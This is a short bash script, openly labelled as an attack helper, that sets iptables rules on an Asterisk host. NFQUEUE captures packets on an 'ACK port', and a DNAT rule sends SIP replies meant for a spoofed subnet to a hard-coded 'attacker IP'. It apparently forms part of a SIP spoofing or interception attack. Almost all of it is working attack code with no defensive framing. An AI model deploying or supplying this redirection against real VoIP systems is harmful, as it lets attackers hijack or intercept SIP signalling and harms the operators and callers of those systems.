#!/bin/bash
# Modular return path NAT setup

ACK_RETURN_QUEUE_NUM=${1:-2}
ACK_PORT=${2:-4000}
SIP_PORT=${3:-5060}
SPOOFED_SUBNET=${4:-"10.10.123.0/25"}
ATTACKER_IP=${5:-"143.53.142.93"}

echo "[+] Setting up return path NAT rules"
echo "    - ACK Return Queue: $ACK_RETURN_QUEUE_NUM"
echo "    - ACK Port: $ACK_PORT"
echo "    - SIP Port: $SIP_PORT"
echo "    - Spoofed Subnet: $SPOOFED_SUBNET"
echo "    - Attacker IP: $ATTACKER_IP"

# Match responses redirected to attacker port
sudo iptables -I OUTPUT -p udp --dport "$ACK_PORT" -j NFQUEUE --queue-num "$ACK_RETURN_QUEUE_NUM"

# Redirect Asterisk replies to attacker (DNAT)
sudo iptables -t nat -I OUTPUT -p udp --sport "$SIP_PORT" -d "$SPOOFED_SUBNET" -j DNAT --to-destination "$ATTACKER_IP:$ACK_PORT"

if [ $? -eq 0 ]; then
    echo "[+] Return path NAT rules applied successfully"
    exit 0
else
    echo "[!] Failed to apply return path NAT rules"
    exit 1
fi
